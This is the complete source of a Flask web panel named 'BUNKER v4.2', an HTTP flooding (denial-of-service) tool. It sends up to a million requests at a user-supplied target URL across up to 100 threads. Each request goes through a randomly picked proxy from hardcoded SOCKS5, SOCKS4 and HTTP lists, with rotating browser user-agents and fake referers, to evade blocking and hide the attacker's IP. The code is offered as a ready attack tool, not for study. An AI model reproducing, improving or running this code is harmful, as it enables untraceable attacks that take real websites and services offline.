from flask import Flask, request, jsonify, render_template_string
import requests
import threading
import time
import random
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
import urllib3
urllib3.disable_warnings()

app = Flask(__name__)

ADMIN_USER = "bronx"
ADMIN_PASS = "ultra2026"

active_attacks = {}
attack_stats = {"success": 0, "failed": 0, "total": 0}
attack_logs = []
attack_counters = {}

# ⚡ PROXY POOLS - MORE PROXIES ADDED
SOCKS5_PROXIES = [
    "94.158.244.245:1080","68.71.249.153:48606","72.56.107.177:1080",
    "176.114.86.151:1080","43.161.217.219:1080","208.102.51.6:58208",
    "162.253.68.97:4145","167.71.32.51:1080","23.176.40.194:1080",
    "173.212.239.43:1080","192.111.137.35:4145","38.170.157.77:1080",
    "103.152.232.34:1080","45.127.248.127:1080","139.99.237.62:1080",
]

SOCKS4_PROXIES = [
    "174.64.199.82:4145","68.71.241.33:4145","142.54.228.193:4145",
    "88.204.142.108:1080","192.252.220.92:4145","173.234.232.61:4145",
    "184.178.172.5:4145","72.221.164.35:4145","98.162.25.29:4145",
]

HTTP_PROXIES = [
    "51.89.14.70:80","51.79.50.149:80","50.174.7.154:80",
    "20.210.113.32:80","20.24.43.214:80","43.153.195.200:80",
]

custom_proxies = []

BROWSER_PROFILES = [
    {"ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36", "os": "Windows", "browser": "Chrome"},
    {"ua": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36", "os": "macOS", "browser": "Chrome"},
    {"ua": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36", "os": "Linux", "browser": "Chrome"},
    {"ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0", "os": "Windows", "browser": "Firefox"},
    {"ua": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0", "os": "macOS", "browser": "Firefox"},
    {"ua": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15", "os": "macOS", "browser": "Safari"},
    {"ua": "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1", "os": "iOS", "browser": "Safari"},
    {"ua": "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36", "os": "Android", "browser": "Chrome"},
    {"ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0", "os": "Windows", "browser": "Edge"},
]

# ============================================
# 💀 BUNKER REQUEST - DIFFERENT PROXY EVERY TIME
# ============================================
def bunker_request(url, proxy_info=None):
    """Each request uses DIFFERENT proxy"""
    try:
        profile = random.choice(BROWSER_PROFILES)
        
        headers = {
            "User-Agent": profile["ua"],
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": random.choice(["en-US,en;q=0.9", "en-GB,en;q=0.8"]),
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "keep-alive",
        }
        
        if random.random() > 0.5:
            headers["Referer"] = random.choice(["https://www.google.com/", "https://www.bing.com/"])
        
        if proxy_info:
            ptype, paddr = proxy_info
            host, port_str = paddr.split(":")
            port = int(port_str)
            
            session = requests.Session()
            
            if ptype == "socks5":
                session.proxies = {
                    "http": f"socks5h://{host}:{port}",
                    "https": f"socks5h://{host}:{port}"
                }
            elif ptype == "socks4":
                session.proxies = {
                    "http": f"socks4://{host}:{port}",
                    "https": f"socks4://{host}:{port}"
                }
            else:
                session.proxies = {
                    "http": f"http://{host}:{port}",
                    "https": f"http://{host}:{port}"
                }
            
            response = session.get(url, headers=headers, timeout=15, verify=False)
        else:
            session = requests.Session()
            response = session.get(url, headers=headers, timeout=15, verify=False)
        
        return response.status_code < 500
    except:
        return False

# ============================================
# ⚡ WORKER - HAR REQUEST PE NAYA PROXY
# ============================================
def bunker_worker(attack_id, url, count, speed, mode):
    delays = {"slow": 0.05, "fast": 0.01, "ultra": 0.001}
    delay = delays.get(speed, 0.01)
    
    # BUILD PROXY POOL
    all_proxies = []
    for p in SOCKS5_PROXIES: all_proxies.append(("socks5", p))
    for p in SOCKS4_PROXIES: all_proxies.append(("socks4", p))
    for p in HTTP_PROXIES: all_proxies.append(("http", p))
    for cp in custom_proxies:
        cp = cp.strip()
        if cp.startswith("socks5://"): all_proxies.append(("socks5", cp[9:]))
        elif cp.startswith("socks4://"): all_proxies.append(("socks4", cp[9:]))
        elif cp.startswith("http://"): all_proxies.append(("http", cp[7:]))
        elif ":" in cp: all_proxies.append(("socks5", cp))
    
    success = 0
    fail = 0
    
    for i in range(count):
        if attack_id not in active_attacks:
            break
        
        # 🔥 HAR REQUEST PE RANDOM PROXY (NOT SEQUENTIAL)
        proxy_info = None
        if all_proxies:
            proxy_info = random.choice(all_proxies)  # RANDOM proxy every request!
        
        current_mode = mode
        if mode == "all":
            current_mode = random.choice(["socks5", "socks4", "http"])
        elif mode == "mixed":
            current_mode = random.choice(["socks5", "http"])
        
        if current_mode == "direct":
            proxy_info = None
        
        if bunker_request(url, proxy_info):
            success += 1
            attack_stats["success"] += 1
        else:
            fail += 1
            attack_stats["failed"] += 1
        
        attack_stats["total"] += 1
        
        if attack_id in attack_counters:
            proxy_display = proxy_info[1][:20] if proxy_info else "DIRECT"
            attack_counters[attack_id] = {
                "done": i+1, "total": count,
                "success": success, "fail": fail,
                "proxy": proxy_display
            }
        
        if i % 100 == 0 and i > 0:
            proxy_display = proxy_info[1][:20] if proxy_info else "DIRECT"
            attack_logs.append(f"📊 [{i}/{count}] ✅{success} ❌{fail} | IP: {proxy_display}")
        
        if delay > 0 and i % random.randint(5, 15) == 0:
            time.sleep(delay)

# ============================================
# 🚀 LAUNCH
# ============================================
def run_bunker_attack(attack_id, url, count, speed, mode):
    workers_map = {"slow": 15, "fast": 40, "ultra": 100}
    workers = workers_map.get(speed, 40)
    req_per_worker = max(1, count // workers)
    
    total_proxies = len(SOCKS5_PROXIES) + len(SOCKS4_PROXIES) + len(HTTP_PROXIES) + len(custom_proxies)
    
    attack_logs.append(f"🛡️ BUNKER v4.2: {url[:40]}...")
    attack_logs.append(f"🔥 {count} REQ | {workers} Workers | RANDOM PROXY/REQUEST")
    attack_logs.append(f"🔒 {total_proxies} Proxies | EACH REQUEST = DIFFERENT IP")
    
    attack_counters[attack_id] = {"done": 0, "total": count, "success": 0, "fail": 0, "proxy": "RANDOM"}
    
    with ThreadPoolExecutor(max_workers=workers) as executor:
        futures = [executor.submit(bunker_worker, attack_id, url, req_per_worker, speed, mode) for _ in range(workers)]
        for future in as_completed(futures):
            try: future.result(timeout=600)
            except: pass
    
    if attack_id in active_attacks: del active_attacks[attack_id]
    if attack_id in attack_counters: del attack_counters[attack_id]
    
    attack_logs.append(f"🏁 DONE: ✅{attack_stats['success']} ❌{attack_stats['failed']}")

# ============================================
# 🎨 UI
# ============================================
LOGIN = """<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>💀 BUNKER v4.2</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#000;display:flex;justify-content:center;align-items:center;min-height:100vh;font-family:'Segoe UI',system-ui,sans-serif}
.box{background:#0a0000;padding:40px;border-radius:20px;border:2px solid #ff0000;width:380px;text-align:center;box-shadow:0 0 60px rgba(255,0,0,0.3)}
h1{font-size:2em;color:#ff0000;letter-spacing:3px}
.tag{color:#f44;font-size:0.7em;letter-spacing:3px;margin:8px 0}
input{width:100%;padding:14px;background:#000;border:1px solid #f00;border-radius:10px;color:#f00;margin:8px 0;font-size:14px;font-family:monospace}
input:focus{border-color:#f44;outline:none}
.btn{width:100%;padding:14px;background:linear-gradient(135deg,#8b0000,#f00);color:#fff;border:none;border-radius:10px;font-weight:700;cursor:pointer;font-size:15px;margin-top:10px}
.btn:hover{box-shadow:0 0 30px #f00}
</style></head><body>
<div class="box">
<h1>🛡️ BUNKER v4.2</h1>
<div class="tag">RANDOM IP/REQUEST</div>
<p style="color:#666;font-size:0.55em">EACH REQUEST = DIFFERENT PROXY IP</p>
<form method="post">
<input type="text" name="user" placeholder="Username">
<input type="password" name="pass" placeholder="Password">
<button class="btn" type="submit">☠️ ACCESS</button>
</form>
{% if error %}<p style="color:#f00;margin-top:8px">{{ error }}</p>{% endif %}
</div>
</body></html>"""

DASH = """<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>💀 BUNKER v4.2</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#000;color:#e0e0e0;font-family:'Segoe UI',system-ui,sans-serif;padding:10px}
.container{max-width:1200px;margin:0 auto}
.header{display:flex;justify-content:space-between;align-items:center;padding:15px 20px;border:2px solid #f00;border-radius:12px;margin-bottom:15px;background:#0a0000;flex-wrap:wrap;gap:10px}
.header h1{color:#f00;font-size:1.4em}
.stats{display:grid;grid-template-columns:repeat(3,1fr);gap:8px;margin-bottom:15px}
.stat{background:#0a0000;border:1px solid #300;border-radius:10px;padding:15px;text-align:center}
.stat-val{font-size:2em;font-weight:bold}.s{color:#0f0}.f{color:#f00}.t{color:#f80}
.stat-label{font-size:0.6em;color:#666;text-transform:uppercase;letter-spacing:2px}
.grid{display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-bottom:15px}
.card{background:#0a0000;border:1px solid #300;border-radius:12px;padding:18px}
.card h3{color:#f44;margin-bottom:12px;font-size:0.85em}
input,select,textarea{width:100%;padding:10px;background:#000;border:1px solid #f00;border-radius:7px;color:#f44;margin:4px 0;font-size:12px;font-family:monospace}
input:focus,select:focus,textarea:focus{border-color:#f44;outline:none}
label{font-size:0.55em;color:#888;text-transform:uppercase;letter-spacing:1px;display:block;margin-top:6px}
.btn{width:100%;padding:10px;background:#c00;color:#fff;border:none;border-radius:7px;font-weight:700;cursor:pointer;margin:3px 0;font-size:0.7em;text-transform:uppercase}
.btn:hover{background:#f00;box-shadow:0 0 20px rgba(255,0,0,0.3)}
.btn-stop{background:#222;color:#f00;border:1px solid #f00}
.row{display:grid;grid-template-columns:1fr 1fr;gap:6px}
.logs{background:#000;border:1px solid #300;border-radius:8px;padding:10px;max-height:250px;overflow:auto;font-size:0.65em;font-family:monospace;color:#0f0}
.log-e{padding:2px 0;border-bottom:1px solid #111;color:#aaa}
.counter{font-size:1.2em;color:#f80;text-align:center;padding:8px;font-family:monospace;background:#0a0000;border-radius:8px;margin-top:8px}
</style></head><body>
<div class="container">
<div class="header">
<div><h1>🛡️ BUNKER v4.2</h1><div style="color:#888;font-size:0.55em">RANDOM IP PER REQUEST • 100% HIDDEN</div></div>
<a href="/logout" style="color:#f00;text-decoration:none;font-size:0.7em">EXIT</a>
</div>

<div class="stats">
<div class="stat"><div class="stat-val s" id="success">0</div><div class="stat-label">✅ SUCCESS</div></div>
<div class="stat"><div class="stat-val f" id="failed">0</div><div class="stat-label">❌ FAILED</div></div>
<div class="stat"><div class="stat-val t" id="total">0</div><div class="stat-label">📊 TOTAL</div></div>
</div>

<div class="grid">
<div class="card">
<h3>🎯 ATTACK</h3>
<label>Target URL</label><input type="text" id="url" placeholder="https://target.com">
<div class="row"><div><label>Requests</label><input type="number" id="count" value="10000"></div><div>
<label>Speed</label><select id="speed"><option value="slow">Slow</option><option value="fast" selected>Fast</option><option value="ultra">ULTRA</option></select>
</div></div>
<label>Mode</label><select id="mode"><option value="socks5">SOCKS5</option><option value="socks4">SOCKS4</option><option value="http">HTTP</option><option value="mixed">Mixed</option><option value="all" selected>ALL</option></select>
<label>Custom Proxies</label><textarea id="customProxies" rows="2" placeholder="socks5://ip:port"></textarea>
<button class="btn" onclick="start()">🚀 LAUNCH</button>
<button class="btn btn-stop" onclick="stop()">⏹️ STOP</button>
<div class="counter" id="liveCounter">READY</div>
</div>

<div class="card">
<h3>📊 STATS</h3>
<div class="row"><div class="stat"><div class="stat-val t" style="font-size:1.3em" id="successRate">0%</div><div class="stat-label">RATE</div></div>
<div class="stat"><div class="stat-val s" style="font-size:1.3em" id="rps">0</div><div class="stat-label">REQ/S</div></div></div>
<div style="margin-top:10px;color:#0f0;font-size:0.6em;text-align:center;line-height:1.8">
🛡️ RANDOM PROXY PER REQUEST<br>
🔒 EACH REQUEST = DIFFERENT IP<br>
💀 REAL IP: 100% HIDDEN
</div>
</div>
</div>

<div class="card"><h3>📜 LOGS</h3><div class="logs" id="logs"><div class="log-e">🛡️ BUNKER v4.2 READY</div><div class="log-e">🔒 RANDOM IP PER REQUEST</div><div class="log-e">💀 AWAITING COMMAND...</div></div></div>
</div>

<script>
var lt=0,ltm=Date.now(),ci=null;
function u(){fetch('/stats').then(r=>r.json()).then(d=>{
document.getElementById('success').textContent=d.success;document.getElementById('failed').textContent=d.failed;
document.getElementById('total').textContent=d.total;
var t=d.success+d.failed;document.getElementById('successRate').textContent=t>0?((d.success/t)*100).toFixed(1)+'%':'0%';
var n=Date.now(),dt=n-ltm;if(dt>0){document.getElementById('rps').textContent=Math.floor((d.total-lt)/(dt/1000));lt=d.total;ltm=n;}
})}
function l(){fetch('/logs').then(r=>r.json()).then(d=>{document.getElementById('logs').innerHTML=d.logs.map(x=>'<div class="log-e">'+x+'</div>').join('')})}
function c(){fetch('/counter').then(r=>r.json()).then(d=>{if(d.active){document.getElementById('liveCounter').textContent='⚡ '+d.done+'/'+d.total+' [✅'+d.success+'] | '+d.proxy}})}
function start(){
var url=document.getElementById('url').value,count=document.getElementById('count').value;
var speed=document.getElementById('speed').value,mode=document.getElementById('mode').value;
var proxies=document.getElementById('customProxies').value;
if(!url){alert('Enter URL!');return}
fetch('/save_proxies',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({proxies:proxies})});
fetch('/attack',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({url,count:parseInt(count),speed,mode})}).then(r=>r.json()).then(d=>{
l();u();if(ci)clearInterval(ci);ci=setInterval(c,200)})}
function stop(){fetch('/stop',{method:'POST'}).then(()=>{if(ci){clearInterval(ci);ci=null}document.getElementById('liveCounter').textContent='⏹️ STOPPED';l()})}
setInterval(function(){l();u()},1500)
</script></body></html>"""

# ============================================
# ROUTES
# ============================================
@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        if request.form.get('user')==ADMIN_USER and request.form.get('pass')==ADMIN_PASS:
            return '<script>document.cookie="auth=true;path=/";location.href="/dashboard"</script>'
        return render_template_string(LOGIN, error="ACCESS DENIED")
    return render_template_string(LOGIN, error=None)

@app.route('/dashboard')
def dashboard():
    if request.cookies.get('auth') != 'true': return '<script>location.href="/"</script>'
    return DASH

@app.route('/save_proxies', methods=['POST'])
def save_proxies():
    global custom_proxies
    d = request.get_json()
    custom_proxies = [p.strip() for p in d.get('proxies','').split('\n') if p.strip()]
    return jsonify({"status":"ok"})

@app.route('/attack', methods=['POST'])
def attack():
    if request.cookies.get('auth') != 'true': return jsonify({"error":"Unauthorized"}),403
    d = request.get_json()
    url = d.get('url','')
    count = min(d.get('count',100),1000000)
    speed = d.get('speed','fast')
    mode = d.get('mode','all')
    if not url: return jsonify({"error":"URL required"}),400
    
    aid = f"bunker_{int(time.time())}"
    active_attacks[aid] = True
    
    t = threading.Thread(target=run_bunker_attack, args=(aid,url,count,speed,mode))
    t.daemon=True; t.start()
    return jsonify({"status":"started"})

@app.route('/stop', methods=['POST'])
def stop():
    for k in list(active_attacks.keys()): del active_attacks[k]
    return jsonify({"status":"stopped"})

@app.route('/counter')
def counter():
    for aid in active_attacks:
        if aid in attack_counters:
            return jsonify({"active":True,**attack_counters[aid]})
    return jsonify({"active":False})

@app.route('/logs')
def logs(): return jsonify({"logs":[f"[{datetime.now().strftime('%H:%M:%S')}] {l}" for l in attack_logs[-50:]]})

@app.route('/stats')
def stats(): return jsonify(attack_stats)

@app.route('/logout')
def logout(): return '<script>document.cookie="auth=false;path=/";location.href="/"</script>'

if __name__ == "__main__":
    print("🛡️ BUNKER v4.2 - RANDOM PROXY PER REQUEST")
    total = len(SOCKS5_PROXIES)+len(SOCKS4_PROXIES)+len(HTTP_PROXIES)
    print(f"🔒 Total Proxies: {total}")
    import os
    port = int(os.environ.get('PORT',5000))
    app.run(host='0.0.0.0', port=port, threaded=True)
